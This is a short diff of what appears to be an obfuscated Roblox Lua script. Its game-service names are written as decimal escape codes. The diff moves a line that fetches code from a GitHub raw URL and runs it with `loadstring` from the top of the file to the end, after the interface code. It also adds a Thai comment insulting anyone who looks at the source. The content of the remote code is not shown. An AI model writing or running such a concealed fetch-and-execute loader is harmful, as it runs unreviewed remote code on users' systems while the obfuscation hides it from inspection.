@@ -1,6 +1,6 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/oop928/dan191/refs/heads/main/191"))()
+--ระบบกากๆมึงเข้ามาดูเหี้ยไรวะ
 
--- local Players = game:GetService("\80\108\97\121\101\114\115")
+local Players = game:GetService("\80\108\97\121\101\114\115")
 local TweenService = game:GetService("\84\119\101\101\110\83\101\114\118\105\99\101")
 local UserInputService = game:GetService("\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101")
 local MarketplaceService = game:GetService("\77\97\114\107\101\116\112\108\97\99\101\83\101\114\118\105\99\101")
@@ -278,3 +278,6 @@ _cb.MouseButton1Click:Connect(function()
     task.wait(0.25)
     _g:Destroy()
 end)
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/oop928/dan191/refs/heads/main/191"))()
